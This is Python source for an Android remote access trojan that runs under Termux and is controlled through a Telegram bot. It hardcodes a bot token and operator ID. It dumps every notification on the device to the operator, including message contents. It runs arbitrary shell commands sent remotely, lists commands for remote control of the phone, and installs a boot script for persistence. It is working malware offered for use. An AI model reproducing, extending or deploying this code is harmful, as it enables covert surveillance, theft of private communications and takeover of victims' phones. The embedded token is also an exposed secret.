import telebot
import os
import subprocess
import time
import json

# === GANTI INI ===
BOT_TOKEN = "7629220575:AAH_lPkp0NMNJtmq53lf54sY5bQkC0tO-SQ"
AUTHORIZED_ID = 7105839598

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != AUTHORIZED_ID: return
    bot.reply_to(message, "✅ **ANDROID NUCLEAR RAT v6.0 ONLINE**\nNotification Dump + Full Control Added 🔥\n/help")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    if message.chat.id != AUTHORIZED_ID: return
    help_text = """
🔥 **NEW in v6.0:**

/notifications         → Dump SEMUA notifikasi aktif (JSON + readable)
/fullcontrol           → Panduan kontrol lengkap (volume, flashlight, dll)
/enable_adb_wireless   → Setup pairing (split screen manual)
/camera_back /camera_front
/screen /mirror
/shell <cmd>
/persistence
/selfdelete
    """
    bot.reply_to(message, help_text)

# === NEW: DUMP ALL NOTIFICATIONS ===
@bot.message_handler(commands=['notifications'])
def notifications(message):
    if message.chat.id != AUTHORIZED_ID: return
    try:
        # Dump raw JSON
        raw = subprocess.getoutput("termux-notification-list")
        bot.reply_to(message, f"📬 Raw Notifications (JSON):\n{raw[:3500]}")
        
        # Parse jadi readable
        try:
            notifs = json.loads(raw)
            readable = "📋 **Readable Notifications:**\n\n"
            for n in notifs:
                title = n.get('title', 'No Title')
                content = n.get('content', 'No Content')
                package = n.get('packageName', 'Unknown')
                readable += f"📱 {package}\nTitle: {title}\nContent: {content}\n---\n"
            bot.send_message(message.chat.id, readable[:4000])
        except:
            bot.reply_to(message, "⚠️ Gagal parse JSON, pakai raw di atas.")
        
        # Save ke file biar bisa di-upload
        with open("/storage/emulated/0/notifs_dump.txt", "w") as f:
            f.write(raw)
        bot.reply_to(message, "✅ Dump disimpan di /storage/emulated/0/notifs_dump.txt")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}\nGrant Notification Access di Termux:API!")

# === NEW: FULL CONTROL GUIDE ===
@bot.message_handler(commands=['fullcontrol'])
def fullcontrol(message):
    if message.chat.id != AUTHORIZED_ID: return
    control_text = """
🔥 **FULL CONTROL COMMANDS (setelah ADB wireless ON):**

1. **Volume Control** (via shell):
   /shell input keyevent 24   → Volume Up
   /shell input keyevent 25   → Volume Down
   /shell input keyevent 164  → Mute

2. **Flashlight**:
   /shell termux-torch on
   /shell termux-torch off

3. **Vibrate**:
   /shell termux-vibrate -d 1000   → Vibrate 1 detik

4. **Open App**:
   /shell am start -n com.whatsapp/.Main   (ganti package name)

5. **Send Text / Key**:
   /shell input text "Hello from RAT"
   /shell input keyevent 66   → Enter

6. **Lock Screen**:
   /shell input keyevent 26   (power button)

7. **Screenshot** (sudah ada /screen)

8. **Mirroring + Control Mouse/Keyboard** (scrcpy di PC):
   Setelah /enable_adb_wireless sukses → jalankan scrcpy di PC.

Pairing Code Tip:
- Buka split screen (Settings Wireless Debugging + Termux)
- Ketik /enable_adb_wireless
- Lihat pairing code di Settings → ketik manual di Termux: adb pair 127.0.0.1:<port> <code>
"""
    bot.reply_to(message, control_text)

# Command lama tetap (camera, screen, mirror, enable_adb_wireless, shell, persistence, dll)

@bot.message_handler(commands=['shell'])
def shell(message):
    if message.chat.id != AUTHORIZED_ID: return
    try:
        cmd = message.text.split(maxsplit=1)[1]
        result = subprocess.getoutput(cmd)
        bot.reply_to(message, f"Output:\n{result[:4000]}")
    except:
        bot.reply_to(message, "❌ /shell <command>")

@bot.message_handler(commands=['persistence'])
def persistence(message):
    if message.chat.id != AUTHORIZED_ID: return
    # Auto start RAT + coba enable ADB
    boot_dir = "/data/data/com.termux/files/home/.termux/boot/"
    os.makedirs(boot_dir, exist_ok=True)
    script_path = os.path.abspath(__file__)
    with open(boot_dir + "start-rat", "w") as f:
        f.write(f"""#!/data/data/com.termux/files/usr/bin/sh
termux-wake-lock
python {script_path}
""")
    os.system(f"chmod +x {boot_dir}start-rat")
    bot.reply_to(message, "✅ Persistence + auto ADB attempt added!")

print("🚀 Android Nuclear RAT v6.0 running with Notification Dump & Full Control... 💥")
bot.infinity_polling()